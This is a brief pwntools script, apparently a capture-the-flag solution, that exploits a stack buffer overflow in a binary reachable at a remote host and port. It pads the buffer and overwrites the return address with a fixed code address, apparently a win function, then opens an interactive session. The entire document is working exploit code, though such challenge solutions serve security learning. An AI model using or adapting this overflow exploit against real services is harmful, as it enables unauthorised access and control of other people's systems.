from pwn import *  

context.arch='amd64'

cn = process("./bin")
cn = remote("mc.ax", 31077)

payload = flat('a' * 0x20, 1, 0x00000000004011F6)
cn.sendline(payload)

cn.interactive()
